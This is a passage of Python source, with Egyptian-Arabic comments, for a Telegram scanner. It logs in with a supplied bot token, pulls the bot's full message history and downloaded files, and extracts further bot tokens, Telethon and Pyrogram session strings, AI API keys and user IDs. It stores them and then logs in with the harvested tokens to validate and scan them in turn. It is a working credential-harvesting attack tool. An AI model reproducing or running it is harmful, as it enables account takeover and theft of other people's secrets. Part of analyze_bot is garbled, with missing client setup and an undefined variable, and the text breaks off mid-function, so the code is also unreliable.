def _find_telethon_sessions(text):
    found = []
    for word in _SESSION_SPLIT.split(text):
        if 301 <= len(word) <= 451 and word[0].isdigit() and word[1].isalpha() and word.endswith('='):
            if _SESSION_FULL.fullmatch(word):
                found.append(word)
    return found

def _mask_bot_token(value):
    try:
        text = str(value or '')
        if ':' in text:
            return text.split(':', 1)[0] + ':***'
        return (text[:4] + '***') if len(text) > 4 else '***'
    except Exception:
        return '***'


def _mask_secret_text(text):
    try:
        text = str(text or '')
        text = TOKEN_PATTERN.sub(lambda m: _mask_bot_token(m.group(0)), text)
        text = AI_KEY_PATTERN.sub(lambda m: m.group(0)[:6] + '***', text)
        return text
    except Exception:
        return '[نص مخفي]'

class _ScanRequestGate:
    """بوابة طلبات الفحص: طلب واحد كل SCAN_REQUEST_SPACING ثانية، من غير استنى الرد.
    الطلبات بتطلع ورا بعض (0.8 ثانية بين طلب والتاني)، والردود بترجع براحتها.
    نفس فكرة تناوب التحقق، بس على مستوى طلبات الفحص كلها: معرفة عدد الرسايل
    وسحب دفعات الرسايل. الفلود ويت مبيتنامش فيه هنا - اللي يجيله فلود بيوقف
    (analyze_bot بيرجع parked)؛ وفي الفحص الشبكي بيرجع الطابور لما يفضى مكان
    وفلوده يخلص عشان يكمل في نفس التشغيل، ومكانه بيدخل فيه بوت تاني.
    الفحص الفردي بيستنى الفلود زي قبل."""
    def __init__(self, spacing=SCAN_REQUEST_SPACING):
        self.spacing = spacing
        self._lock = asyncio.Lock()
        self._next_ok = 0.0

    async def acquire(self):
        async with self._lock:
            now = time.monotonic()
            wait = self._next_ok - now
            if wait > 0:
                await asyncio.sleep(wait)
            self._next_ok = time.monotonic() + self.spacing


SCAN_GATE = _ScanRequestGate()


def _console_listener_thread():
    log_event("أوامر", "مستمع أوامر الطرفية شغال - اكتب .تخطي لتخطي الملفات الجاري تحميلها")
    while True:
        try:
            line = sys.stdin.readline()
        except Exception:
            return
        if not line:
            return
        if line.strip() == ".تخطي":
            if ACTIVE_DOWNLOADS:
                SKIP_DOWNLOAD['requested'] = True
                biggest = max(ACTIVE_DOWNLOADS, key=lambda k: ACTIVE_DOWNLOADS[k])
                log_event("تخطي", f"أمر تخطي وصل - {len(ACTIVE_DOWNLOADS)} ملفات بتحمل دلوقتي، أكبر واحد {biggest} اتحمل منه {ACTIVE_DOWNLOADS[biggest]} بايت لحد دلوقتي")
            else:
                log_event("تخطي", "أمر تخطي وصل بس مفيش ملف بيتحمل دلوقتي")


def start_console_listener():
    threading.Thread(target=_console_listener_thread, daemon=True).start()

def _encode_file_reference(info):
    data = dict(info)
    if isinstance(data.get('file_reference'), bytes):
        data['file_reference'] = base64.b64encode(data['file_reference']).decode('utf-8')
    if isinstance(data.get('bot_info'), dict) and isinstance(data['bot_info'].get('file_reference'), bytes):
        data['bot_info'] = dict(data['bot_info'])
        data['bot_info']['file_reference'] = base64.b64encode(data['bot_info']['file_reference']).decode('utf-8')
    return data


def _decode_file_reference(info):
    data = dict(info)
    if isinstance(data.get('file_reference'), str):
        try:
            data['file_reference'] = base64.b64decode(data['file_reference'])
        except Exception:
            data['file_reference'] = b''
    if isinstance(data.get('bot_info'), dict) and isinstance(data['bot_info'].get('file_reference'), str):
        data['bot_info'] = dict(data['bot_info'])
        try:
            data['bot_info']['file_reference'] = base64.b64decode(data['bot_info']['file_reference'])
        except Exception:
            data['bot_info']['file_reference'] = b''
    return data

async def save_scan_batch(bot_token, users=(), files=(), photos=(), tokens=(), sessions=(), ai_keys=()):
    log_event("تخزين", f"حفظ دفعة للبوت {_mask_bot_token(bot_token)} - مستخدمين {len(list(users or ()))} ملفات {len(list(files or ()))} صور {len(list(photos or ()))} توكنات {len(list(tokens or ()))} جلسات {len(list(sessions or ()))} مفاتيح {len(list(ai_keys or ()))} ")
    async with aiosqlite.connect(DB_PATH) as db:
        for user_id in users or ():
            await db.execute(
                "INSERT OR IGNORE INTO scan_users (bot_token, user_id) VALUES (?, ?)",
                (bot_token, str(user_id))
            )
        for file_info in files or ():
            await db.execute(
                "INSERT OR IGNORE INTO scan_files (bot_token, file_id, data) VALUES (?, ?, ?)",
                (bot_token, int(file_info['id']), json.dumps(_encode_file_reference(file_info)))
            )
        for photo_info in photos or ():
            await db.execute(
                "INSERT OR IGNORE INTO scan_photos (bot_token, photo_id, data) VALUES (?, ?, ?)",
                (bot_token, int(photo_info['id']), json.dumps(_encode_file_reference(photo_info)))
            )
        for token_info in tokens or ():
            await db.execute(
                "INSERT OR IGNORE INTO scan_tokens (bot_token, token, data) VALUES (?, ?, ?)",
                (bot_token, token_info['token'], json.dumps(_encode_file_reference(token_info)))
            )
        for session_info in sessions or ():
            session_text = session_info['session']
            session_hash = hashlib.sha256(session_text.encode('utf-8')).hexdigest()
            await db.execute(
                "INSERT OR IGNORE INTO scan_sessions (bot_token, session_hash, data) VALUES (?, ?, ?)",
                (bot_token, session_hash, json.dumps(session_info))
            )
        for item in ai_keys or ():
            if isinstance(item, dict):
                key_text = item['key']
                data = dict(item)
            else:
                key_text = item
                data = {'key': key_text, 'source': ''}
            await db.execute(
                "INSERT OR IGNORE INTO scan_ai_keys (bot_token, ai_key, data) VALUES (?, ?, ?)",
                (bot_token, key_text, json.dumps(data))
            )
        await db.commit()

async def with_db_retry(func, max_retries=3, delay=0.1):
    """تنفيذ دالة مع إعادة المحاولة عند حدوث أخطاء في قاعدة البيانات"""
    for attempt in range(max_retries):
        try:
            return await func()
        except (sqlite3.OperationalError, sqlite3.DatabaseError) as e:
            log_event("طلب قاعدة بيانات", f"خطأ في قاعدة البيانات، المحاولة {attempt + 1}/{max_retries}: {e}")
            if "database is locked" in str(e) and attempt < max_retries - 1:
                await asyncio.sleep(delay)
            else:
                raise e
        except Exception as e:
            log_event("طلب قاعدة بيانات", f"خطأ، المحاولة {attempt + 1}/{max_retries}: {e}")
            raise e


async def with_telegram_retry(func, max_retries=12, delay=2, label="طلب تليجرام", flood_action="sleep"):
    """تنفيذ دالة مع إعادة المحاولة عند حدوث أخطاء في تليجرام، مع طباعة كل طلب ومحاولة."""
    for attempt in range(max_retries):
        started = time.time()
        try:
            log_event("طلب", f"{label} - المحاولة {attempt + 1}/{max_retries}")
            result = await func()
            log_event("طلب", f"{label} - نجح في {time.time() - started:.2f} ثانية، المحاولة {attempt + 1}/{max_retries}")
            return result
        except RpcCallFailError as e:
            log_event("طلب", f"{label} - مشكلة داخلية في تليجرام، المحاولة {attempt + 1}/{max_retries}: {e}")
            if "internal issues" in str(e).lower() and attempt < max_retries - 1:
                await asyncio.sleep(delay * (attempt + 1))
            else:
                raise e
        except FloodWaitError as e:
            wait_time = e.seconds
            log_event("طلب", f"{label} - فلود ويت، الانتظار {wait_time} ثانية، المحاولة {attempt + 1}/{max_retries}")
            if flood_action == "raise":
                raise
            await asyncio.sleep(wait_time + 1)
            if attempt < max_retries - 1:
                continue
            else:
                log_event("طلب", f"{label} - فشل بعد {max_retries} محاولة بسبب فلود ويت")
                raise e
        except Exception as e:
            log_event("طلب", f"{label} - خطأ في المحاولة {attempt + 1}/{max_retries}: {e}")
            raise e

async def get_chat_history(bot, start_id, end_id, target_id, progress_callback=None, stop_event=None):
    log_event("نقل", f"بدء نقل الرسايل {start_id}-{end_id} إلى {target_id}")
    total_messages = end_id - start_id + 1
    current_id = start_id
    success_count = 0
    failed_count = 0
    last_update_time = 0

    while current_id <= end_id:

        user_state = await get_user_state(target_id)
        if user_state.get('stop_requested'):
            print(f"⏹ تم إيقاف نقل الرسائل بطلب من المستخدم {target_id}")
            break

        try:
            messages = await with_telegram_retry(lambda: bot(GetMessagesRequest([x for x in range(current_id, min(current_id + 100, end_id + 1))])), label="جلب رسايل للنقل")
            for m in messages.messages:

                user_state = await get_user_state(target_id)
                if user_state.get('stop_requested'):
                    break

                if isinstance(m, MessageEmpty):
                    continue
                if await forward_message(bot, m, target_id):
                    success_count += 1
                else:
                    failed_count += 1

                current_time = time.time()
                if progress_callback and (current_time - last_update_time >= 5 or success_count + failed_count == total_messages):
                    last_update_time = current_time
                    if not await progress_callback(success_count + failed_count, total_messages):

                        user_state = await get_user_state(target_id)
                        user_state['stop_requested'] = True
                        await set_user_state(target_id, user_state)
                        break

                await asyncio.sleep(SEND_DELAY)
            current_id += 100


            user_state = await get_user_state(target_id)
            if user_state.get('stop_requested'):
                break

        except Exception as e:
            print(f"Error processing messages {current_id}-{current_id+100}: {e}")
            failed_count += 100
            current_id += 100
            continue

    return success_count, failed_count

async def find_max_message_id(bot, raise_on_flood=False):
    # أسرع طريقة لمعرفة أعلى رقم رسالة: فحص دفعات، لغاية 200 رقم في الطلب الواحد
    # الرسايل المحذوفة بتعمل فراغات في النص، فأي رقم مش موجود مش معناه إن اللي فوقه مش موجود
    # عشان كده البحث مبيعتبرش رقم مفقود سقف أبدا: هو بس بيرفع أقل رقم مؤكد موجود،
    # ومبيرجعش رقم إلا بعد ما يتأكد إن الـ 200 رقم اللي فوقه فاضيين
    log_event("طلب", "بحث عن أعلى رقم رسالة")
    try:
        async def probe(ids):
            await SCAN_GATE.acquire()
            result = await with_telegram_retry(lambda: bot(GetMessagesRequest(ids)), label="بحث عن أعلى رقم رسالة", flood_action="raise" if raise_on_flood else "sleep")
            found = set()
            for msg in result.messages:
                if msg and not isinstance(msg, MessageEmpty):
                    mid = getattr(msg, 'id', None)
                    if isinstance(mid, int):
                        found.add(mid)
            return found

        anchors = [1, 5000, 10000, 20000, 40000, 80000, 160000, 320000, 640000, 1000000]
        afound = await probe(anchors)
        if 1000000 in afound:
            log_event("طلب", "أعلى رقم رسالة: 1000000")
            return 1000000
        low = max(afound) if afound else 0

        while True:
            target = 1000000
            for a in anchors:
                if a > low + 1:
                    target = a
                    break
            span = target - low
            if span <= 200:
                if span > 1:
                    found = await probe(list(range(low + 1, target)))
                    if found:
                        low = max(found)
                        w = await probe(list(range(low + 1, low + 201)))
                        if w:
                            low = max(w)
                            continue
                        break
                # (low, target) فاضية: تأكد بنافذة واحدة فوق target قبل ما ترجع
                w = await probe(list(range(target, target + 200)))
                if w:
                    low = max(w)
                    continue
                break
            step = span // 200
            ids = [low + step * k for k in range(1, 200)]
            found = await probe(ids)
            above = [f for f in found if f > low]
            if above:
                low = max(above)
            # امسك أعلى رقم بالظبط بنافذة كثيفة ورا low، وبعدين أكد بنافذة واحدة
            w = await probe(list(range(low + 1, low + 201)))
            if w:
                low = max(w)
                w2 = await probe(list(range(low + 1, low + 201)))
                if w2:
                    low = max(w2)
                    continue
                break
            # النافذة فاضية: لو الخطوة واسعة، الأعلى ممكن يكون مستخبي بعد النافذة؛ جرب شبكة أدق مرة واحدة
            if step > 200:
                step2 = step // 2
                ids2 = [low + step2 * k for k in range(1, 200) if low + step2 * k < target]
                found2 = await probe(ids2)
                above2 = [f for f in found2 if f > low]
                if above2:
                    low = max(above2)
                    continue
            break

        log_event("طلب", f"أعلى رقم رسالة: {low}")
        return low
    except FloodWaitError:
        raise
    except Exception as e:
        print(f"Error finding max message id: {e}")
        return 0


async def analyze_bot(bot_token, user_id, progress_callback=None, park_on_flood=False):
    """فحص تسلسلي دفعة بدفعة: كل دفعة تحفظ في التخزين فورا، ولا تتراكم في الذاكرة.

    park_on_flood=True بس في الفحص الشبكي: الفلود يوقف البوت ويكمل من نقطة
    الاستئناف في التشغيل الجاي. الفردي (الافتراضي) بيستنى زي قبل."""
    temp_bot = None
    temp_session = None
    try:

            temp_bot.flood_sleep_threshold = 0

        me = await temp_bot.get_me()
        bot_username = me.username
        max_id = await find_max_message_id(temp_bot, raise_on_flood=park_on_flood)
        log_event("فحص", f"بدء فحص البوت {_mask_bot_token(bot_token)} - أعلى رقم {max_id} - الاستئناف من {(progress['last_scanned_id'] + 1) if progress else 1}")
        if progress and progress['is_complete'] and max_id <= progress['last_scanned_id']:
            log_event("تحقق", "الفحص كامل - إكمال التحقق من التوكنات الباقية قبل عرض النتيجة")
            remaining_tokens = await get_scan_tokens(bot_token)
            if remaining_tokens:
                await validate_tokens_parallel(remaining_tokens, bot_token=bot_token)
            await temp_bot.disconnect()
            try:
                if os.path.exists(f"{temp_session}.session"):
                    os.remove(f"{temp_session}.session")
            except Exception:
                pass
            return await load_scan_result(bot_token, bot_username, max_id)
        start_id = 1
        if progress:
            start_id = progress['last_scanned_id'] + 1
        if start_id > max_id:
            log_event("تحقق", "إكمال التحقق من التوكنات الباقية قبل عرض النتيجة")
            remaining_tokens = await get_scan_tokens(bot_token)
            if remaining_tokens:
                await validate_tokens_parallel(remaining_tokens, bot_token=bot_token)
            await set_scan_progress(bot_token, bot_username, max_id, max_id, True)
            await temp_bot.disconnect()
            try:
                if os.path.exists(f"{temp_session}.session"):
                    os.remove(f"{temp_session}.session")
            except Exception:
                pass
            return await load_scan_result(bot_token, bot_username, max_id)
        await set_scan_progress(bot_token, bot_username, start_id - 1, max_id, False)
        chunk_size = 200
        scanned_up_to = start_id - 1
        stopped = False
        if progress_callback:
            initial_percent = ((start_id - 1) / max_id * 100) if max_id else 100.0
            log_event("فحص", f"التقدم المبدئي {initial_percent:.1f}% - مفحوص قبل كده {start_id - 1} من {max_id}")
            if not await progress_callback(start_id - 1, max_id, initial_percent):
                stopped = True
        for i in range(start_id, max_id + 1, chunk_size):
            if stopped:
                break
            user_state = await get_user_state(user_id)
            if user_state.get('stop_requested'):
                stopped = True
                break
            end_range = min(i + chunk_size, max_id + 1)
            chunk = await process_message_chunk(temp_bot, i, end_range, bot_token, user_id, raise_on_flood=park_on_flood)
            await save_scan_batch(
                bot_token,
                users=chunk['users'], files=chunk['files'], photos=chunk['photos'],
                tokens=chunk['tokens'], sessions=chunk['sessions'], ai_keys=chunk['ai_keys']
            )
            scanned_up_to = end_range - 1
            log_event("فحص", f"دفعة {i}-{end_range - 1} خلصت - ملفات {len(chunk['files'])} صور {len(chunk['photos'])} توكنات {len(chunk['tokens'])} جلسات {len(chunk['sessions'])} مفاتيح {len(chunk['ai_keys'])}")
            await set_scan_progress(bot_token, bot_username, scanned_up_to, max_id, scanned_up_to >= max_id)
            if progress_callback:
                progress_percent = (scanned_up_to / max_id * 100) if max_id else 100.0
                if not await progress_callback(scanned_up_to, max_id, progress_percent):
                    stopped = True
                    break
        if not stopped and scanned_up_to >= max_id:
            tokens_list = await get_scan_tokens(bot_token)
            if tokens_list:
                await validate_tokens_parallel(tokens_list, bot_token=bot_token)
            await set_scan_progress(bot_token, bot_username, max_id, max_id, True)
        await temp_bot.disconnect()
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except Exception:
            pass
        result = await load_scan_result(bot_token, bot_username, max_id)
        result['partial'] = bool(stopped)
        log_event("فحص", f"انتهى فحص البوت {_mask_bot_token(bot_token)} - جزئي {bool(stopped)} - مستخدمين {result['total_users']} ملفات {result['total_files']} صور {result['total_photos']} توكنات {result['tokens']['total']} جلسات {result['sessions']['total']} مفاتيح {result['ai_keys']['total']}")
        return result
    except FloodWaitError as e:
        if temp_bot is not None:
            try:
                if temp_bot.is_connected():
                    await temp_bot.disconnect()
            except Exception:
                pass
        if temp_session:
            try:
                if os.path.exists(f"{temp_session}.session"):
                    os.remove(f"{temp_session}.session")
            except Exception:
                pass
        if park_on_flood:
            log_event("فحص", f"فلود ويت على البوت {_mask_bot_token(bot_token)} - الفحص وقف وهيكمل من نقطة الاستئناف في التشغيل الجاي")
            print(f"Bot parked on flood wait: {e}")
            return {'success': False, 'error': f'فلود ويت {getattr(e, "seconds", "?")} ثانية', 'parked': True, 'flood_wait_seconds': getattr(e, 'seconds', None)}
        # الفحص الفردي: الفلود اتنام واتعاد 12 مرة جوه، ولو لسه فاشل يرجع خطأ عادي زي قبل
        print(f"Error analyzing bot: {e}")
        return {'success': False, 'error': str(e)}
    except Exception as e:
        print(f"Error analyzing bot: {e}")
        if temp_bot is not None:
            try:
                if temp_bot.is_connected():
                    await temp_bot.disconnect()
            except Exception:
                pass
        if temp_session:
            try:
                if os.path.exists(f"{temp_session}.session"):
                    os.remove(f"{temp_session}.session")
            except Exception:
                pass
        return {'success': False, 'error': str(e)}


async def process_message_chunk(bot, start_id, end_id, bot_token, user_id=None, raise_on_flood=False):
    """معالجة دفعة واحدة فقط (100 رسالة) وإرجاع نتائجها، بدون تراكم في الذاكرة.
    المتصل يحفظ الدفعة في التخزين فورا ثم يتخلص منها."""
    chunk = {'users': set(), 'files': [], 'photos': [], 'tokens': [], 'sessions': [], 'ai_keys': []}
    log_event("فحص", f"بدء دفعة رسايل {start_id}-{end_id - 1}")
    download_jobs = []
    job_names = {}
    seen_tokens = set()
    seen_sessions_telethon = set()
    seen_sessions_pyrogram = set()
    seen_ai_keys = set()
    try:
        message_ids = list(range(start_id, end_id))
        await SCAN_GATE.acquire()
        messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)), label="جلب دفعة رسايل", flood_action="raise" if raise_on_flood else "sleep")

        def _collect_text(text, source):
            for token in TOKEN_PATTERN.findall(text):
                if token not in seen_tokens:
                    seen_tokens.add(token)
                    chunk['tokens'].append({'token': token, 'valid': False, 'bot_info': {}})
            for key_text in AI_KEY_PATTERN.findall(text):
                if key_text not in seen_ai_keys:
                    seen_ai_keys.add(key_text)
                    chunk['ai_keys'].append({'key': key_text, 'source': source})
            for word in _find_telethon_sessions(text):
                if word not in seen_sessions_telethon:
                    seen_sessions_telethon.add(word)
                    chunk['sessions'].append({'session': word, 'source': source, 'type': 'telethon'})
            if len(text) > 1000000:
                step = 1000000
                overlap = 1000
                pos = 0
                while pos < len(text):
                    part = text[pos:pos + step + overlap]
                    for session in _PYROGRAM_FIND.findall(part):
                        if session not in seen_sessions_pyrogram:
                            seen_sessions_pyrogram.add(session)
                            chunk['sessions'].append({'session': session, 'source': source, 'type': 'pyrogram'})
                    pos += step
                    if pos % 10000000 == 0 and pos < len(text):
                        log_event("فحص", f"فحص نص {source} - وصل {pos}/{len(text)} حرف")
            else:
                for session in _PYROGRAM_FIND.findall(text):
                    if session not in seen_sessions_pyrogram:
                        seen_sessions_pyrogram.add(session)
                        chunk['sessions'].append({'session': session, 'source': source, 'type': 'pyrogram'})

        for msg in messages.messages:
            if isinstance(msg, MessageEmpty):
                continue
            if hasattr(msg, 'from_id') and msg.from_id:
                user_id_str = str(msg.from_id.user_id) if hasattr(msg.from_id, 'user_id') else str(msg.from_id)
                chunk['users'].add(user_id_str)
            if hasattr(msg, 'reply_to') and msg.reply_to:
                if hasattr(msg.reply_to, 'from_id') and msg.reply_to.from_id:
                    reply_user_id = str(msg.reply_to.from_id.user_id) if hasattr(msg.reply_to.from_id, 'user_id') else str(msg.reply_to.from_id)
                    chunk['users'].add(reply_user_id)
            if hasattr(msg, 'peer_id'):
                if hasattr(msg.peer_id, 'user_id'):
                    chunk['users'].add(str(msg.peer_id.user_id))
                elif hasattr(msg.peer_id, 'chat_id'):
                    chunk['users'].add(str(msg.peer_id.chat_id))
                elif hasattr(msg.peer_id, 'channel_id'):
                    chunk['users'].add(str(msg.peer_id.channel_id))
            if hasattr(msg, 'media'):
                if isinstance(msg.media, MessageMediaDocument):
                    if hasattr(msg.media, 'document') and isinstance(msg.media.document, Document):
                        document = msg.media.document
                        original_name = f"file_{document.id}"
                        file_extension = "bin"
                        for attr in document.attributes:
                            if isinstance(attr, DocumentAttributeFilename):
                                original_name = attr.file_name
                                if '.' in original_name:
                                    file_extension = original_name.split('.')[-1]
                                break
                        chunk['files'].append({
                            'id': document.id,
                            'access_hash': document.access_hash,
                            'file_reference': document.file_reference,
                            'original_name': original_name,
                            'file_extension': file_extension,
                            'name': original_name,
                            'size': getattr(document, 'size', 0) or 0
                        })
                        log_event("تحميل", f"ملف {document.id} - الاسم {original_name} - الحجم {getattr(document, 'size', 0) or 0} بايت، يعني حوالي {(getattr(document, 'size', 0) or 0) / 1024:.1f} كيلو - قبل التحميل")
                        if file_extension.lower() in NON_SCANNABLE_EXTENSIONS:
                            log_event("تخطي", f"ملف {document.id} - الاسم {original_name} - وسائط/تطبيق، مش هيتحمل ولا يتفحص")
                        else:
                            download_jobs.append((document.id, InputDocumentFileLocation(
                                id=document.id,
                                access_hash=document.access_hash,
                                file_reference=document.file_reference,
                                thumb_size=''
                            )))
                            job_names[document.id] = original_name
                elif isinstance(msg.media, MessageMediaPhoto):
                    if hasattr(msg.media, 'photo') and isinstance(msg.media.photo, Photo):
                        photo = msg.media.photo
                        chunk['photos'].append({
                            'id': photo.id,
                            'access_hash': photo.access_hash,
                            'file_reference': photo.file_reference,
                            'original_name': f"photo_{photo.id}.jpg",
                            'file_extension': "jpg",
                            'name': f"photo_{photo.id}.jpg",
                            'size': max([getattr(sz, 'size', 0) or 0 for sz in getattr(photo, 'sizes', [])], default=0)
                        })
            if hasattr(msg, 'message') and msg.message:
                _collect_text(msg.message, 'chat')
        if download_jobs:
            downloaded_files = await _download_batch_files(bot, [(loc, True, 12) for _doc_id, loc in download_jobs])
            for (doc_id, _loc), file_data in zip(download_jobs, downloaded_files):
                if not file_data:
                    continue
                original_name = job_names.get(doc_id, f"file_{doc_id}")
                try:
                    log_event("فحص", f"بدء فحص نص ملف {doc_id} - {original_name} - {len(file_data)} بايت")
                    text_data = file_data.decode(errors="ignore")
                    _collect_text(text_data, 'file')
                    log_event("فحص", f"انتهى فحص نص ملف {doc_id} - توكنات {len(chunk['tokens'])} جلسات {len(chunk['sessions'])} مفاتيح {len(chunk['ai_keys'])}")
                    inner_session_names = []
                    try:
                        with zipfile.ZipFile(io.BytesIO(file_data)) as z:
                            for fname in z.namelist():
                                if fname.lower().endswith('.session'):
                                    inner_session_names.append(fname)
                                if fname.lower().endswith((".txt", ".json", ".py", ".php", ".js", ".html", ".xml")):
                                    try:
                                        content = z.read(fname).decode(errors="ignore")
                                        _collect_text(content, 'zip')
                                    except Exception:
                                        continue
                    except Exception:
                        pass
                    if not inner_session_names and original_name.lower().endswith('.rar'):
                        inner_session_names = await _rar_session_names_via_tools(file_data)
                    if inner_session_names:
                        for _f in chunk['files']:
                            if _f.get('id') == doc_id:
                                _f['inner_sessions'] = inner_session_names
                                break
                        log_event("فحص", f"ملف {doc_id} - جواه {len(inner_session_names)} ملف .session")
                except Exception:
                    pass
    except FloodWaitError:
        raise
    except Exception as e:
        print(f"Error processing chunk {start_id}-{end_id}: {e}")
    chunk['users'] = list(chunk['users'])
    log_event("فحص", f"انتهت دفعة رسايل {start_id}-{end_id - 1} - مستخدمين {len(chunk['users'])} ملفات {len(chunk['files'])} صور {len(chunk['photos'])} توكنات {len(chunk['tokens'])} جلسات {len(chunk['sessions'])} مفاتيح {len(chunk['ai_keys'])}")
    return chunk


_TRANSIENT_KEYWORDS = ('connection', 'network', 'timed out', 'timeout', 'temporarily',
                       'unreachable', 'reset by peer', 'broken pipe',
                       'name or service not known', 'flood', 'eof occurred',
                       'server disconnected', 'internal issues')


def _is_transient_error(e):
    """خطأ مؤقت (نت فصل أو مشكلة مؤقتة في تليجرام) مش معناه التوكن بايظ."""
    if isinstance(e, (ConnectionError, OSError, TimeoutError, asyncio.TimeoutError)):
        return True
    text = (type(e).__name__ + ' ' + str(e)).lower()
    return any(k in text for k in _TRANSIENT_KEYWORDS)


def _is_transient_error_text(text):
    """نفس الفحص على نص خطأ متخزن قبل كده، عشان نعيد فحص التوكنات اللي اتعلم عليها بايظ بسبب النت."""
    if not text:
        return False
    t = str(text).lower()
    return any(k in t for k in _TRANSIENT_KEYWORDS)


VALIDATE_REQUEST_SPACING = 0.8
VALIDATE_MIN_TOKEN_GAP = 16.0


async def _validate_token_begin(token):
    """تجهيز توكن للتحقق: كاش، دخول، معلومات البوت، أعلى رقم رسالة، نقطة الاستئناف.
    ترجع (session, None) لو محتاج جلب دفعات، أو (None, final_result) لو خلص من غير طلبات."""
    try:
        cached_token = await get_cached_token(token)
        if cached_token:
            if (not cached_token.get('valid')) and _is_transient_error_text(cached_token.get('error', '')):
                log_event("تحقق", f"كاش التوكن {_mask_bot_token(token)} كان خطأ مؤقت - إعادة الفحص")
            else:
                return None, cached_token
        log_event("تحقق", f"بدء التحقق من توكن {_mask_bot_token(token)}")
        temp_session = os.path.join(SESSION_DIR, f"validate_token_{int(time.time())}_{hash(token)}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        temp_bot.flood_sleep_threshold = 0
        await temp_bot.start(bot_token=token)
        me = await with_telegram_retry(lambda: temp_bot.get_me(), label="معلومات البوت")
        await with_telegram_retry(lambda: temp_bot(GetFullUserRequest(me.id)), label="معلومات البوت الكاملة")
        max_id = await find_max_message_id(temp_bot, raise_on_flood=True)
        progress = await get_scan_progress(token)
        start_id = (progress['last_scanned_id'] + 1) if progress else 1
        if progress:
            log_event("تحقق", f"التوكن {_mask_bot_token(token)} مفحوص قبل كده لحد رسالة {progress['last_scanned_id']} من {max_id} - هيكمل الزيادة بس")
        session = {
            'token': token,
            'client': temp_bot,
            'session_file': temp_session,
            'me': me,
            'max_id': max_id,
            'next_id': start_id,
            'failed_batches': 0,
            'quarantine_until': 0,
            'last_request_at': 0,
            'in_flight': False,
        }
        return session, None
    except Exception as e:
        if _is_transient_error(e):
            log_event("تحقق", f"خطأ مؤقت أثناء التحقق من توكن {_mask_bot_token(token)}: {e} - مش هيتعلم بايظ ومش هيتخزن")
            return None, {'valid': False, 'error': str(e), 'transient': True}
        result = {'valid': False, 'error': str(e)}
        await set_cached_token(token, result)
        return None, result


async def _validate_fetch_batch(session, pending):
    """جلب دفعة واحدة (200 رسالة) لتوكن مجهز. الفلود ويت يحجر التوكن بدل ما ينام فيه."""
    task = asyncio.current_task()
    try:
        token = session['token']
        start = session['next_id']
        max_id = session['max_id']
        end_range = min(start + 200, max_id + 1)
        local_users = set()
        try:
            message_ids = list(range(start, end_range))
            messages = await session['client'](GetMessagesRequest(message_ids))
            for msg in messages.messages:
                if isinstance(msg, MessageEmpty):
                    continue
                if hasattr(msg, 'from_id') and msg.from_id:
                    user_id_str = str(msg.from_id.user_id) if hasattr(msg.from_id, 'user_id') else str(msg.from_id)
                    local_users.add(user_id_str)
                if hasattr(msg, 'reply_to') and msg.reply_to:
                    if hasattr(msg.reply_to, 'from_id') and msg.reply_to.from_id:
                        reply_user_id = str(msg.reply_to.from_id.user_id) if hasattr(msg.reply_to.from_id, 'user_id') else str(msg.reply_to.from_id)
                        local_users.add(reply_user_id)
                if hasattr(msg, 'peer_id'):
                    if hasattr(msg.peer_id, 'user_id'):
                        local_users.add(str(msg.peer_id.user_id))
                    elif hasattr(msg.peer_id, 'chat_id'):
                        local_users.add(str(msg.peer_id.chat_id))
                    elif hasattr(msg.peer_id, 'channel_id'):
                        local_users.add(str(msg.peer_id.channel_id))
        except FloodWaitError as e:
            session['quarantine_until'] = time.time() + e.seconds + 1
            log_event("تحقق", f"فلود ويت على توكن {_mask_bot_token(token)} - هيتحجر {e.seconds} ثانية والباقيين مكملين")
            return
        except Exception as e:
            print(f"Error processing messages {start}-{end_range}: {e}")
            session['failed_batches'] += 1
            session['next_id'] = end_range
            return
        try:
            if local_users:
                await save_scan_batch(token, users=list(local_users))
        except Exception as e:
            print(f"Error saving batch {start}-{end_range}: {e}")
            session['failed_batches'] += 1
        session['next_id'] = end_range
    finally:
        session['in_flight'] = False
        if task is not None:
            pending.discard(task)


async def _validate_token_finish(session):
    """إنهاء توكن بعد جلب كل دفعاته: فصل، حذف ملف الجلسة، النتيجة النهائية."""
    token = session['token']
    try:
        await session['client'].disconnect()
    except Exception:
        pass
    try:
        if os.path.exists(f"{session['session_file']}.session"):
            os.remove(f"{session['session_file']}.session")
    except Exception:
        pass
    if session['failed_batches']:
        log_event("تحقق", f"فشل {session['failed_batches']} دفعة أثناء عد مستخدمين التوكن {_mask_bot_token(token)} - خطأ مؤقت، مش هيتعلم بايظ وهيتعاد فحصه بعدين")
        return {'valid': False, 'error': f"{session['failed_batches']} batch(es) failed", 'transient': True}
    counts = await load_scan_counts(token)
    result = {
        'valid': True,
        'bot_name': session['me'].first_name,
        'bot_username': session['me'].username,
        'bot_id': session['me'].id,
        'total_messages': session['max_id'],
        'total_users': counts['total_users']
    }
    await set_cached_token(token, result)
    return result


async def validate_tokens_parallel(tokens_list, max_concurrent=20, bot_token=None):
    """التحقق من التوكنات بالتناوب: طلب واحد كل 0.8 ثانية بالدور على التوكنات النشطة،
    فكل توكن بيعدي عليه 16 ثانية على الأقل بين طلب والتاني. التوكن اللي يجيله فلود ويت
    بيتحجر لحد ما مدته تخلص ودوره بيروح لتوكن سليم، وبعدين بيرجع."""
    log_event("تحقق", f"بدء التحقق من {len(tokens_list)} توكن")
    tokens_to_validate = []
    for token_info in tokens_list:
        if token_info.get('processed', False):
            if (not token_info.get('valid')) and _is_transient_error_text(
                    token_info.get('bot_info', {}).get('error', '')):
                log_event("تحقق", f"توكن {_mask_bot_token(token_info['token'])} اتعلم بايظ قبل كده بسبب خطأ مؤقت - إعادة فحصه")
                token_info['processed'] = False
                tokens_to_validate.append(token_info)
            continue
        tokens_to_validate.append(token_info)
    if not tokens_to_validate:
        return {}
    log_event("تحقق", f"تناوب {VALIDATE_REQUEST_SPACING} ثانية بين الطلبات، فجوة {VALIDATE_MIN_TOKEN_GAP} ثانية لكل توكن")
    queue = list(tokens_to_validate)
    results = {}
    active = []
    pending_setups = set()
    pending_batches = set()
    next_turn = 0

    async def _apply_result(token_info, result):
        if isinstance(result, Exception):
            print(f"❌ خطأ في التحقق من التوكن: {result}")
            token_info['valid'] = False
            token_info['bot_info'] = {'error': str(result)}
        elif result.get('transient'):
            log_event("تحقق", f"خطأ مؤقت أثناء التحقق من توكن {_mask_bot_token(token_info['token'])} - مش هيتعلم بايظ وهيتعاد فحصه بعدين")
            token_info['valid'] = False
            token_info['bot_info'] = result
        else:
